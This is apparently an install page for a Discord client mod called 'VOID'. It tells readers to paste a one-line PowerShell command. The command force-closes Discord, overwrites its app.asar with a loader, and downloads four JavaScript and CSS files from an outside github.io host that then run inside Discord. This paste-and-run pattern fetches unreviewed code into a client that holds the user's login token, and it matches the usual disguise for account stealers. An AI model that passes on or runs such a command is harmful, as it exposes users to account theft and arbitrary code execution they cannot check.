Install VOID

One command does everything — no Vencord required. VOID patches Discord directly.

1
Open PowerShell — press Win + R, type powershell, press Enter.
2
Paste the command below and press Enter. It patches Discord's app directory and downloads VOID automatically.
3
Discord restarts with VOID built in. Open Settings — look for VOID Settings in the sidebar!
PowerShell
$d="$env:APPDATA\Vencord\dist"; New-Item -ItemType Directory -Force $d|Out-Null; $dc="$env:LOCALAPPDATA\Discord"; $la=(Get-ChildItem $dc -Directory 2>$null|?{$_.Name -match '^app-'}|Sort-Object Name -Desc|Select-Object -First 1).FullName; if($la){$res="$la\resources"; Remove-Item "$res\app" -Recurse -Force -EA 0;$asar="$res\app.asar"; $orig="$res\_app.asar"; if((Test-Path $asar)-and(Get-Item $asar).Length -gt 10000 -and !(Test-Path $orig)){Copy-Item $asar $orig -Force}; $ij='require(require("path").join(process.env.APPDATA,"Vencord","dist","patcher.js"));'; $pj='{"name":"discord","version":"0.0.1","main":"index.js"}'; $ib=[Text.Encoding]::UTF8.GetBytes($ij); $pb=[Text.Encoding]::UTF8.GetBytes($pj); $h='{"files":{"index.js":{"size":'+$ib.Length+',"offset":"0"},"package.json":{"size":'+$pb.Length+',"offset":"'+$ib.Length+'"}}}'; $hb=[Text.Encoding]::UTF8.GetBytes($h); $pl=[int]([Math]::Ceiling($hb.Length/4.0)*4); $ph=New-Object byte[] $pl; [Array]::Copy($hb,$ph,$hb.Length); $buf=New-Object byte[] (16+$pl+$ib.Length+$pb.Length); [BitConverter]::GetBytes([uint32]4).CopyTo($buf,0); [BitConverter]::GetBytes([uint32](4+$pl)).CopyTo($buf,4); [BitConverter]::GetBytes([uint32]$hb.Length).CopyTo($buf,8); [BitConverter]::GetBytes([uint32]0).CopyTo($buf,12); $ph.CopyTo($buf,16); $ib.CopyTo($buf,16+$pl); $pb.CopyTo($buf,16+$pl+$ib.Length); [IO.File]::WriteAllBytes($asar,$buf)}; Get-Process Discord -EA 0|Stop-Process -Force; Start-Sleep 2; $b="https://orelazugi1-code.github.io/void-discord"; "patcher.js","preload.js","renderer.js","renderer.css"|%{iwr "$b/$_" -OutFile "$d\$_" -UseBasicParsing}; Start-Process "$dc\Update.exe" "--processStart Discord.exe" -EA 0; Write-Host "VOID installed! Open Discord Settings and look for VOID Settings."

Click the box to select all, or use the Copy button. Paste into PowerShell and press Enter.
